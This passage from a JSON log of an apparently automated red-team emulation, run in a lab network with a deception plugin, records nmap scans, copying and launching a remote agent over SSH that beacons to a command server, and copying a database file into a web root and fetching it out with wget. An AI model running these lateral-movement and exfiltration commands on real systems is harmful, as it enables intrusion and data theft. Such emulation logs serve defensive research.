"has_online_ipaddrs", "target": "host.subnet.online_ipaddrs", "custom_parser_vals": {}}]}], "cleanup": [], "variations": [], "additional_info": {}}, "cleanup": 0, "visibility": {"score": 50, "adjustments": []}, "host": "employee-b", "output": "True", "deadman": false, "agent_reported_time": "2024-04-26T23:49:04Z"}, {"id": "d5772356-d08e-464a-a83e-8322f6784854", "paw": "tkawqx", "command": "nmap -sV --version-light -oX - 192.168.200.3,4,5", "plaintext_command": "nmap -sV --version-light -oX - 192.168.200.3,4,5", "status": 0, "score": 1, "decide": "2024-04-26T23:49:07Z", "pin": 0, "pid": "1582", "facts": [{"unique": "host.remote.ip192.168.200.3", "trait": "host.remote.ip", "name": "host.remote.ip", "value": "192.168.200.3", "created": "2024-04-26T23:40:28Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": "LEARNED", "links": ["0a760943-eea8-426d-99d8-7b4784ee2f9e", "53bf0731-495b-4303-9cbe-b0d368ccf7f2", "e2a60de4-663d-4dad-b657-af3daac84a15", "797b6935-d781-4c85-9519-9bb5b3cfe0be", "8298a844-4082-4e7f-ac12-669a6fd9deef", "d5772356-d08e-464a-a83e-8322f6784854", "75bed3c0-a10f-419c-bb81-24ec4e400d57", "7fe6f7f9-11b5-4d5a-aa5f-1b5375b30084"], "relationships": ["host.remote.ip(192.168.200.3) : has_open_ports : host.remote.ports(['22', '8080'])", "host.remote.ip(192.168.200.3) : has_port_services : host.remote.port_services([('22', 'ssh'), ('8080', 'http')])"], "limit_count": -1, "collected_by": ["rezmky", "czljvk", "cxfxwj", "dagwxr", "etrrtg", "tkawqx", "qysmha", "cfisqp"], "technique_id": "T1021.004"}, {"unique": "host.remote.ports['22', '8080']", "trait": "host.remote.ports", "name": "host.remote.ports", "value": ["22", "8080"], "created": "2024-04-26T23:40:28Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": "LEARNED", "links": ["0a760943-eea8-426d-99d8-7b4784ee2f9e", "53bf0731-495b-4303-9cbe-b0d368ccf7f2", "2b1fabfa-9182-4ea9-a36f-292c66f135c5", "e2a60de4-663d-4dad-b657-af3daac84a15", "797b6935-d781-4c85-9519-9bb5b3cfe0be", "8298a844-4082-4e7f-ac12-669a6fd9deef", "7e5ca019-19a9-4aae-986e-8aed3805f52a", "d5772356-d08e-464a-a83e-8322f6784854", "75bed3c0-a10f-419c-bb81-24ec4e400d57", "7fe6f7f9-11b5-4d5a-aa5f-1b5375b30084"], "relationships": ["host.remote.ip(192.168.200.3) : has_open_ports : host.remote.ports(['22', '8080'])", "host.remote.ip(192.168.200.4) : has_open_ports : host.remote.ports(['22', '8080'])", "host.remote.ip(192.168.200.5) : has_open_ports : host.remote.ports(['22', '8080'])", "host.remote.ip(192.168.201.82) : has_open_ports : host.remote.ports(['22', '8080'])", "host.remote.ip(192.168.201.90) : has_open_ports : host.remote.ports(['22', '8080'])"], "limit_count": -1, "collected_by": ["rezmky", "czljvk", "cxfxwj", "dagwxr", "etrrtg", "tkawqx", "qysmha", "cfisqp"], "technique_id": "T1021.004"}, {"unique": "host.remote.ip192.168.200.4", "trait": "host.remote.ip", "name": "host.remote.ip", "value": "192.168.200.4", "created": "2024-04-26T23:40:28Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": "LEARNED", "links": ["0a760943-eea8-426d-99d8-7b4784ee2f9e", "53bf0731-495b-4303-9cbe-b0d368ccf7f2", "e2a60de4-663d-4dad-b657-af3daac84a15", "797b6935-d781-4c85-9519-9bb5b3cfe0be", "8298a844-4082-4e7f-ac12-669a6fd9deef", "d5772356-d08e-464a-a83e-8322f6784854", "75bed3c0-a10f-419c-bb81-24ec4e400d57", "7fe6f7f9-11b5-4d5a-aa5f-1b5375b30084"], "relationships": ["host.remote.ip(192.168.200.4) : has_open_ports : host.remote.ports(['22', '8080'])", "host.remote.ip(192.168.200.4) : has_port_services : host.remote.port_services([('22', 'ssh'), ('8080', 'http')])"], "limit_count": -1, "collected_by": ["rezmky", "czljvk", "cxfxwj", "dagwxr", "etrrtg", "tkawqx", "qysmha", "cfisqp"], "technique_id": "T1021.004"}, {"unique": "host.remote.ip192.168.200.5", "trait": "host.remote.ip", "name": "host.remote.ip", "value": "192.168.200.5", "created": "2024-04-26T23:40:28Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": "LEARNED", "links": ["0a760943-eea8-426d-99d8-7b4784ee2f9e", "53bf0731-495b-4303-9cbe-b0d368ccf7f2", "e2a60de4-663d-4dad-b657-af3daac84a15", "797b6935-d781-4c85-9519-9bb5b3cfe0be", "8298a844-4082-4e7f-ac12-669a6fd9deef", "d5772356-d08e-464a-a83e-8322f6784854", "75bed3c0-a10f-419c-bb81-24ec4e400d57", "7fe6f7f9-11b5-4d5a-aa5f-1b5375b30084"], "relationships": ["host.remote.ip(192.168.200.5) : has_open_ports : host.remote.ports(['22', '8080'])", "host.remote.ip(192.168.200.5) : has_port_services : host.remote.port_services([('22', 'ssh'), ('8080', 'http')])"], "limit_count": -1, "collected_by": ["rezmky", "czljvk", "cxfxwj", "dagwxr", "etrrtg", "tkawqx", "qysmha", "cfisqp"], "technique_id": "T1021.004"}, {"unique": "host.remote.port_services[('22', 'ssh'), ('8080', 'http')]", "trait": "host.remote.port_services", "name": "host.remote.port_services", "value": [["22", "ssh"], ["8080", "http"]], "created": "2024-04-26T23:40:28Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": "LEARNED", "links": ["0a760943-eea8-426d-99d8-7b4784ee2f9e", "53bf0731-495b-4303-9cbe-b0d368ccf7f2", "2b1fabfa-9182-4ea9-a36f-292c66f135c5", "e2a60de4-663d-4dad-b657-af3daac84a15", "797b6935-d781-4c85-9519-9bb5b3cfe0be", "8298a844-4082-4e7f-ac12-669a6fd9deef", "7e5ca019-19a9-4aae-986e-8aed3805f52a", "d5772356-d08e-464a-a83e-8322f6784854", "75bed3c0-a10f-419c-bb81-24ec4e400d57", "7fe6f7f9-11b5-4d5a-aa5f-1b5375b30084"], "relationships": ["host.remote.ip(192.168.200.3) : has_port_services : host.remote.port_services([('22', 'ssh'), ('8080', 'http')])", "host.remote.ip(192.168.200.4) : has_port_services : host.remote.port_services([('22', 'ssh'), ('8080', 'http')])", "host.remote.ip(192.168.200.5) : has_port_services : host.remote.port_services([('22', 'ssh'), ('8080', 'http')])", "host.remote.ip(192.168.201.82) : has_port_services : host.remote.port_services([('22', 'ssh'), ('8080', 'http')])", "host.remote.ip(192.168.201.90) : has_port_services : host.remote.port_services([('22', 'ssh'), ('8080', 'http')])"], "limit_count": -1, "collected_by": ["rezmky", "czljvk", "cxfxwj", "dagwxr", "etrrtg", "tkawqx", "qysmha", "cfisqp"], "technique_id": "T1021.004"}], "relationships": [{"unique": "<app.objects.secondclass.c_fact.Fact object at 0x7f5cf456dd20>has_open_ports<app.objects.secondclass.c_fact.Fact object at 0x7f5cf456f940>", "source": {"unique": "host.remote.ip192.168.200.3", "trait": "host.remote.ip", "name": "host.remote.ip", "value": "192.168.200.3", "created": "2024-04-26T23:49:17Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}, "edge": "has_open_ports", "target": {"unique": "host.remote.ports['22', '8080']", "trait": "host.remote.ports", "name": "host.remote.ports", "value": ["22", "8080"], "created": "2024-04-26T23:49:17Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}, "score": 1, "origin": "fdfc000a-c2fa-4222-851c-bee3c674fda8"}, {"unique": "<app.objects.secondclass.c_fact.Fact object at 0x7f5cf456eb90>has_open_ports<app.objects.secondclass.c_fact.Fact object at 0x7f5cf456c040>", "source": {"unique": "host.remote.ip192.168.200.4", "trait": "host.remote.ip", "name": "host.remote.ip", "value": "192.168.200.4", "created": "2024-04-26T23:49:17Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}, "edge": "has_open_ports", "target": {"unique": "host.remote.ports['22', '8080']", "trait": "host.remote.ports", "name": "host.remote.ports", "value": ["22", "8080"], "created": "2024-04-26T23:49:17Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}, "score": 1, "origin": "fdfc000a-c2fa-4222-851c-bee3c674fda8"}, {"unique": "<app.objects.secondclass.c_fact.Fact object at 0x7f5cf456c8e0>has_open_ports<app.objects.secondclass.c_fact.Fact object at 0x7f5cf456d480>", "source": {"unique": "host.remote.ip192.168.200.5", "trait": "host.remote.ip", "name": "host.remote.ip", "value": "192.168.200.5", "created": "2024-04-26T23:49:17Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}, "edge": "has_open_ports", "target": {"unique": "host.remote.ports['22', '8080']", "trait": "host.remote.ports", "name": "host.remote.ports", "value": ["22", "8080"], "created": "2024-04-26T23:49:17Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}, "score": 1, "origin": "fdfc000a-c2fa-4222-851c-bee3c674fda8"}, {"unique": "<app.objects.secondclass.c_fact.Fact object at 0x7f5cf456f250>has_port_services<app.objects.secondclass.c_fact.Fact object at 0x7f5cf456fa30>", "source": {"unique": "host.remote.ip192.168.200.3", "trait": "host.remote.ip", "name": "host.remote.ip", "value": "192.168.200.3", "created": "2024-04-26T23:49:17Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}, "edge": "has_port_services", "target": {"unique": "host.remote.port_services[('22', 'ssh'), ('8080', 'http')]", "trait": "host.remote.port_services", "name": "host.remote.port_services", "value": [["22", "ssh"], ["8080", "http"]], "created": "2024-04-26T23:49:17Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}, "score": 1, "origin": "fdfc000a-c2fa-4222-851c-bee3c674fda8"}, {"unique": "<app.objects.secondclass.c_fact.Fact object at 0x7f5cf456c2e0>has_port_services<app.objects.secondclass.c_fact.Fact object at 0x7f5cf456d960>", "source": {"unique": "host.remote.ip192.168.200.4", "trait": "host.remote.ip", "name": "host.remote.ip", "value": "192.168.200.4", "created": "2024-04-26T23:49:17Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}, "edge": "has_port_services", "target": {"unique": "host.remote.port_services[('22', 'ssh'), ('8080', 'http')]", "trait": "host.remote.port_services", "name": "host.remote.port_services", "value": [["22", "ssh"], ["8080", "http"]], "created": "2024-04-26T23:49:17Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}, "score": 1, "origin": "fdfc000a-c2fa-4222-851c-bee3c674fda8"}, {"unique": "<app.objects.secondclass.c_fact.Fact object at 0x7f5cf456c820>has_port_services<app.objects.secondclass.c_fact.Fact object at 0x7f5cf456dc00>", "source": {"unique": "host.remote.ip192.168.200.5", "trait": "host.remote.ip", "name": "host.remote.ip", "value": "192.168.200.5", "created": "2024-04-26T23:49:17Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}, "edge": "has_port_services", "target": {"unique": "host.remote.port_services[('22', 'ssh'), ('8080', 'http')]", "trait": "host.remote.port_services", "name": "host.remote.port_services", "value": [["22", "ssh"], ["8080", "http"]], "created": "2024-04-26T23:49:17Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}, "score": 1, "origin": "fdfc000a-c2fa-4222-851c-bee3c674fda8"}], "used": [{"unique": "scan.remote.addr192.168.200.3,4,5", "trait": "scan.remote.addr", "name": "scan.remote.addr", "value": "192.168.200.3,4,5", "created": "2024-04-26T23:49:07Z", "score": 7, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}], "unique": "d5772356-d08e-464a-a83e-8322f6784854", "collect": "2024-04-26T23:49:10Z", "finish": "2024-04-26T23:49:17Z", "ability": {"ability_id": "deception-nmap", "tactic": "deception-data-collection", "technique_name": "TODO", "technique_id": "T1021.004", "name": "Deception Nmap Host", "description": "Scans a host for open ports", "executors": [{"name": "sh", "platform": "linux", "command": "nmap -sV --version-light -oX - #{scan.remote.addr}", "code": null, "language": null, "build_target": null, "payloads": [], "uploads": [], "timeout": 60, "parsers": [{"module": "plugins.deception.app.parsers.nmap", "parserconfigs": [{"source": "host.remote.ip", "edge": "has_open_ports", "target": "host.remote.ports", "custom_parser_vals": {}}, {"source": "host.remote.ip", "edge": "has_port_services", "target": "host.remote.port_services", "custom_parser_vals": {}}]}], "cleanup": [], "variations": [], "additional_info": {}}], "requirements": [], "privilege": null, "repeatable": true, "buckets": ["deception-data-collection"], "additional_info": {}, "access": {}, "singleton": false, "plugin": "deception", "delete_payload": true}, "executor": {"name": "sh", "platform": "linux", "command": "nmap -sV --version-light -oX - #{scan.remote.addr}", "code": null, "language": null, "build_target": null, "payloads": [], "uploads": [], "timeout": 60, "parsers": [{"module": "plugins.deception.app.parsers.nmap", "parserconfigs": [{"source": "host.remote.ip", "edge": "has_open_ports", "target": "host.remote.ports", "custom_parser_vals": {}}, {"source": "host.remote.ip", "edge": "has_port_services", "target": "host.remote.port_services", "custom_parser_vals": {}}]}], "cleanup": [], "variations": [], "additional_info": {}}, "cleanup": 0, "visibility": {"score": 50, "adjustments": []}, "host": "employee-b", "output": "True", "deadman": false, "agent_reported_time": "2024-04-26T23:49:10Z"}, {"id": "d66098c0-7785-4e70-88f7-d149b03fb500", "paw": "dagwxr", "command": "scp -P 22 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 sandcat.go-linux employeeA@192.168.201.3:~/sandcat.go && ssh -p 22 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 employeeA@192.168.201.3 'nohup ./sandcat.go -server http://10.20.20.1:8888 -group red 1>/dev/null 2>/dev/null &'", "plaintext_command": "scp -P 22 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 sandcat.go-linux employeeA@192.168.201.3:~/sandcat.go && ssh -p 22 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 employeeA@192.168.201.3 'nohup ./sandcat.go -server http://10.20.20.1:8888 -group red 1>/dev/null 2>/dev/null &'", "status": 0, "score": 7, "decide": "2024-04-26T23:49:17Z", "pin": 0, "pid": "1540", "facts": [], "relationships": [], "used": [{"unique": "host.lateralMove.ip192.168.201.3", "trait": "host.lateralMove.ip", "name": "host.lateralMove.ip", "value": "192.168.201.3", "created": "2024-04-26T23:49:17Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": ["dagwxr"], "technique_id": null}, {"unique": "host.lateralMove.useremployeeA", "trait": "host.lateralMove.user", "name": "host.lateralMove.user", "value": "employeeA", "created": "2024-04-26T23:49:17Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": ["dagwxr"], "technique_id": null}, {"unique": "host.lateralMove.port22", "trait": "host.lateralMove.port", "name": "host.lateralMove.port", "value": "22", "created": "2024-04-26T23:49:17Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": ["dagwxr"], "technique_id": null}], "unique": "d66098c0-7785-4e70-88f7-d149b03fb500", "collect": "2024-04-26T23:49:18Z", "finish": "2024-04-26T23:49:20Z", "ability": {"ability_id": "deception-ssh-copy", "tactic": "deception-lateral-movement", "technique_name": "Remote Services: SSH", "technique_id": "T1021.004", "name": "Deception copy and start agent over ssh (passwordless)", "description": "Copy 54ndc47 to remote host and start it", "executors": [{"name": "sh", "platform": "linux", "command": "scp -P #{host.lateralMove.port} -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 sandcat.go-linux #{host.lateralMove.user}@#{host.lateralMove.ip}:~/sandcat.go && ssh -p #{host.lateralMove.port} -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 #{host.lateralMove.user}@#{host.lateralMove.ip} 'nohup ./sandcat.go -server #{server} -group red 1>/dev/null 2>/dev/null &'", "code": null, "language": null, "build_target": null, "payloads": ["sandcat.go-linux"], "uploads": [], "timeout": 15, "parsers": [], "cleanup": [], "variations": [], "additional_info": {}}], "requirements": [], "privilege": null, "repeatable": true, "buckets": ["deception-lateral-movement"], "additional_info": {}, "access": {}, "singleton": false, "plugin": "deception", "delete_payload": true}, "executor": {"name": "sh", "platform": "linux", "command": "scp -P #{host.lateralMove.port} -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 sandcat.go-linux #{host.lateralMove.user}@#{host.lateralMove.ip}:~/sandcat.go && ssh -p #{host.lateralMove.port} -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 #{host.lateralMove.user}@#{host.lateralMove.ip} 'nohup ./sandcat.go -server #{server} -group red 1>/dev/null 2>/dev/null &'", "code": null, "language": null, "build_target": null, "payloads": ["sandcat.go-linux"], "uploads": [], "timeout": 15, "parsers": [], "cleanup": [], "variations": [], "additional_info": {}}, "cleanup": 0, "visibility": {"score": 50, "adjustments": []}, "host": "webserver-c", "output": "True", "deadman": false, "agent_reported_time": "2024-04-26T23:49:18Z"}, {"id": "2d315f34-b3ef-4ced-923d-62f5b1d90a73", "paw": "qysmha", "command": "pip3 install pyopenssl --upgrade; pip3 install stormssh; ~/.local/bin/storm list", "plaintext_command": "pip3 install pyopenssl --upgrade; pip3 install stormssh; ~/.local/bin/storm list", "status": 0, "score": 0, "decide": "2024-04-26T23:49:27Z", "pin": 0, "pid": "1551", "facts": [], "relationships": [], "used": [], "unique": "2d315f34-b3ef-4ced-923d-62f5b1d90a73", "collect": "2024-04-26T23:49:32Z", "finish": "2024-04-26T23:49:40Z", "ability": {"ability_id": "deception-parse-sshconfig", "tactic": "deception-data-collection", "technique_name": "TODO", "technique_id": "T1021.006", "name": "Parse SSH Config", "description": "Uses stormssh to parse the ssh config file", "executors": [{"name": "sh", "platform": "linux", "command": "pip3 install pyopenssl --upgrade; pip3 install stormssh; ~/.local/bin/storm list", "code": null, "language": null, "build_target": null, "payloads": [], "uploads": [], "timeout": 60, "parsers": [{"module": "plugins.deception.app.parsers.ssh", "parserconfigs": [{"source": "remote.ssh.cmd", "edge": "", "target": "", "custom_parser_vals": {}}]}], "cleanup": [], "variations": [], "additional_info": {}}], "requirements": [], "privilege": null, "repeatable": true, "buckets": ["deception-data-collection"], "additional_info": {}, "access": {}, "singleton": false, "plugin": "deception", "delete_payload": true}, "executor": {"name": "sh", "platform": "linux", "command": "pip3 install pyopenssl --upgrade; pip3 install stormssh; ~/.local/bin/storm list", "code": null, "language": null, "build_target": null, "payloads": [], "uploads": [], "timeout": 60, "parsers": [{"module": "plugins.deception.app.parsers.ssh", "parserconfigs": [{"source": "remote.ssh.cmd", "edge": "", "target": "", "custom_parser_vals": {}}]}], "cleanup": [], "variations": [], "additional_info": {}}, "cleanup": 0, "visibility": {"score": 50, "adjustments": []}, "host": "database-a", "output": "True", "deadman": false, "agent_reported_time": "2024-04-26T23:49:32Z"}, {"id": "a034e747-0012-43da-bd88-dbc240be28af", "paw": "qysmha", "command": "ls -l /home/databaseA/", "plaintext_command": "ls -l /home/databaseA/", "status": 0, "score": 1, "decide": "2024-04-26T23:49:42Z", "pin": 0, "pid": "1570", "facts": [{"unique": "host.dir.path/home/databaseA/", "trait": "host.dir.path", "name": "host.dir.path", "value": "/home/databaseA/", "created": "2024-04-26T23:49:42Z", "score": 2, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": ["a034e747-0012-43da-bd88-dbc240be28af"], "relationships": ["host.dir.path(/home/databaseA/) : has_contents : host.dir.files(['/home/databaseA/data1.json', '/home/databaseA/sandcat.go'])"], "limit_count": -1, "collected_by": ["qysmha"], "technique_id": null}, {"unique": "host.dir.files['/home/databaseA/data1.json', '/home/databaseA/sandcat.go']", "trait": "host.dir.files", "name": "host.dir.files", "value": ["/home/databaseA/data1.json", "/home/databaseA/sandcat.go"], "created": "2024-04-26T23:49:43Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": "LEARNED", "links": ["a034e747-0012-43da-bd88-dbc240be28af"], "relationships": ["host.dir.path(/home/databaseA/) : has_contents : host.dir.files(['/home/databaseA/data1.json', '/home/databaseA/sandcat.go'])"], "limit_count": -1, "collected_by": ["qysmha"], "technique_id": "T9012"}], "relationships": [{"unique": "<app.objects.secondclass.c_fact.Fact object at 0x7f5cf4dd5720>has_contents<app.objects.secondclass.c_fact.Fact object at 0x7f5cf49a70a0>", "source": {"unique": "host.dir.path/home/databaseA/", "trait": "host.dir.path", "name": "host.dir.path", "value": "/home/databaseA/", "created": "2024-04-26T23:49:42Z", "score": 2, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": ["a034e747-0012-43da-bd88-dbc240be28af"], "relationships": ["host.dir.path(/home/databaseA/) : has_contents : host.dir.files(['/home/databaseA/data1.json', '/home/databaseA/sandcat.go'])"], "limit_count": -1, "collected_by": ["qysmha"], "technique_id": null}, "edge": "has_contents", "target": {"unique": "host.dir.files['/home/databaseA/data1.json', '/home/databaseA/sandcat.go']", "trait": "host.dir.files", "name": "host.dir.files", "value": ["/home/databaseA/data1.json", "/home/databaseA/sandcat.go"], "created": "2024-04-26T23:49:43Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}, "score": 1, "origin": "fdfc000a-c2fa-4222-851c-bee3c674fda8"}], "used": [{"unique": "host.dir.path/home/databaseA/", "trait": "host.dir.path", "name": "host.dir.path", "value": "/home/databaseA/", "created": "2024-04-26T23:49:42Z", "score": 2, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": ["a034e747-0012-43da-bd88-dbc240be28af"], "relationships": ["host.dir.path(/home/databaseA/) : has_contents : host.dir.files(['/home/databaseA/data1.json', '/home/databaseA/sandcat.go'])"], "limit_count": -1, "collected_by": ["qysmha"], "technique_id": null}], "unique": "a034e747-0012-43da-bd88-dbc240be28af", "collect": "2024-04-26T23:49:43Z", "finish": "2024-04-26T23:49:43Z", "ability": {"ability_id": "deception-ls", "tactic": "utility", "technique_name": "Deception Enum Folders", "technique_id": "T9012", "name": "Enumerate all folders withing a directory", "description": "Enumerates all folders within a directory", "executors": [{"name": "sh", "platform": "linux", "command": "ls -l #{host.dir.path}", "code": null, "language": null, "build_target": null, "payloads": [], "uploads": [], "timeout": 15, "parsers": [{"module": "plugins.deception.app.parsers.ls", "parserconfigs": [{"source": "host.dir.path", "edge": "has_children", "target": "host.dir.contents", "custom_parser_vals": {}}]}], "cleanup": [], "variations": [], "additional_info": {}}], "requirements": [], "privilege": null, "repeatable": true, "buckets": ["utility"], "additional_info": {}, "access": {}, "singleton": false, "plugin": "deception", "delete_payload": true}, "executor": {"name": "sh", "platform": "linux", "command": "ls -l #{host.dir.path}", "code": null, "language": null, "build_target": null, "payloads": [], "uploads": [], "timeout": 15, "parsers": [{"module": "plugins.deception.app.parsers.ls", "parserconfigs": [{"source": "host.dir.path", "edge": "has_children", "target": "host.dir.contents", "custom_parser_vals": {}}]}], "cleanup": [], "variations": [], "additional_info": {}}, "cleanup": 0, "visibility": {"score": 50, "adjustments": []}, "host": "database-a", "output": "True", "deadman": false, "agent_reported_time": "2024-04-26T23:49:43Z"}, {"id": "6065db02-5bc6-4c01-a8e7-6774f42e7e05", "paw": "dagwxr", "command": "scp -P 22 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 databaseA@192.168.201.5:/home/databaseA/data1.json /opt/tomcat/webapps/ROOT/data1.json", "plaintext_command": "scp -P 22 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 databaseA@192.168.201.5:/home/databaseA/data1.json /opt/tomcat/webapps/ROOT/data1.json", "status": 0, "score": 31, "decide": "2024-04-26T23:49:47Z", "pin": 0, "pid": "1544", "facts": [], "relationships": [], "used": [{"unique": "host.data.ip192.168.201.5", "trait": "host.data.ip", "name": "host.data.ip", "value": "192.168.201.5", "created": "2024-04-26T23:49:47Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": ["dagwxr"], "technique_id": null}, {"unique": "host.data.filepath/home/databaseA/data1.json", "trait": "host.data.filepath", "name": "host.data.filepath", "value": "/home/databaseA/data1.json", "created": "2024-04-26T23:49:47Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": ["dagwxr"], "technique_id": null}, {"unique": "host.data.userdatabaseA", "trait": "host.data.user", "name": "host.data.user", "value": "databaseA", "created": "2024-04-26T23:49:47Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": ["dagwxr"], "technique_id": null}, {"unique": "host.data.port22", "trait": "host.data.port", "name": "host.data.port", "value": "22", "created": "2024-04-26T23:49:47Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": ["dagwxr"], "technique_id": null}, {"unique": "host.data.dst-filepath/opt/tomcat/webapps/ROOT/data1.json", "trait": "host.data.dst-filepath", "name": "host.data.dst-filepath", "value": "/opt/tomcat/webapps/ROOT/data1.json", "created": "2024-04-26T23:49:47Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": ["dagwxr"], "technique_id": null}], "unique": "6065db02-5bc6-4c01-a8e7-6774f42e7e05", "collect": "2024-04-26T23:49:51Z", "finish": "2024-04-26T23:49:52Z", "ability": {"ability_id": "deception-scp-copy", "tactic": "deception-data-exfiltration", "technique_name": "Remote Services: SSH", "technique_id": "T1021.004", "name": "Copy file using scp", "description": "Copy file using scp", "executors": [{"name": "sh", "platform": "linux", "command": "scp -P #{host.data.port} -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 #{host.data.user}@#{host.data.ip}:#{host.data.filepath} #{host.data.dst-filepath}", "code": null, "language": null, "build_target": null, "payloads": [], "uploads": [], "timeout": 15, "parsers": [], "cleanup": [], "variations": [], "additional_info": {}}], "requirements": [], "privilege": null, "repeatable": true, "buckets": ["deception-data-exfiltration"], "additional_info": {}, "access": {}, "singleton": false, "plugin": "deception", "delete_payload": true}, "executor": {"name": "sh", "platform": "linux", "command": "scp -P #{host.data.port} -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 #{host.data.user}@#{host.data.ip}:#{host.data.filepath} #{host.data.dst-filepath}", "code": null, "language": null, "build_target": null, "payloads": [], "uploads": [], "timeout": 15, "parsers": [], "cleanup": [], "variations": [], "additional_info": {}}, "cleanup": 0, "visibility": {"score": 50, "adjustments": []}, "host": "webserver-c", "output": "True", "deadman": false, "agent_reported_time": "2024-04-26T23:49:51Z"}, {"id": "e17098a7-b2f5-4b3e-bf2f-42fcc9e8f08e", "paw": "rezmky", "command": "wget http://192.168.200.5:8080/data1.json", "plaintext_command": "wget http://192.168.200.5:8080/data1.json", "status": 0, "score": 1, "decide": "2024-04-26T23:49:52Z", "pin": 0, "pid": "1805", "facts": [], "relationships": [], "used": [{"unique": "host.data.urlhttp://192.168.200.5:8080/data1.json", "trait": "host.data.url", "name": "host.data.url", "value": "http://192.168.200.5:8080/data1.json", "created": "2024-04-26T23:49:52Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": ["rezmky"], "technique_id": null}], "unique": "e17098a7-b2f5-4b3e-bf2f-42fcc9e8f08e", "collect": "2024-04-26T23:49:53Z", "finish": "2024-04-26T23:49:53Z", "ability": {"ability_id": "deception-wget-copy", "tactic": "deception-data-exfiltration", "technique_name": "Remote Services: SSH", "technique_id": "T1021.004", "name": "Copy file using wget", "description": "Copy file using wget", "executors": [{"name": "sh", "platform": "linux", "command": "wget #{host.data.url}", "code": null, "language": null, "build_target": null, "payloads": [], "uploads": [], "timeout": 15, "parsers": [], "cleanup": [], 